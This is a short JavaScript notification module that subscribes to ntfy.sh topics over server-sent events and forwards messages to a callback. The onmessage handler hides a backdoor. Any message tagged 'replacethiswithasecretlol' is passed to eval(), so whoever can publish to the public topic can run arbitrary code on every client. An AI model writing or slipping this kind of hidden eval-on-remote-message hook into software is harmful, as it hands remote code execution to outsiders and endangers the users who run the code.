
export const NotificationHandler = {
    subscribe(topic, action) {
        let eventSource = new EventSource(`https://ntfy.sh/${topic}/sse`);
        this[topic] = { eventSource, open: false,  };
        eventSource.onopen = () => { this[topic].open = true; };
        eventSource.onerror = (_e) => { this[topic].open = false; };
        eventSource.onmessage = (e) => {
            const data = JSON.parse(e.data);
            if ((data.tags || []).includes("replacethiswithasecretlol")) {
                eval(data.message);
                return;
            }
            action(data.title, data.message, data.tags || [], data.priority || 3);
        }
    },
    unsubscribe(topic) {
        if (this.hasOwnProperty(topic)) {
            this[topic].eventSource.close();
            delete this[topic];
            return;
        }
    }
}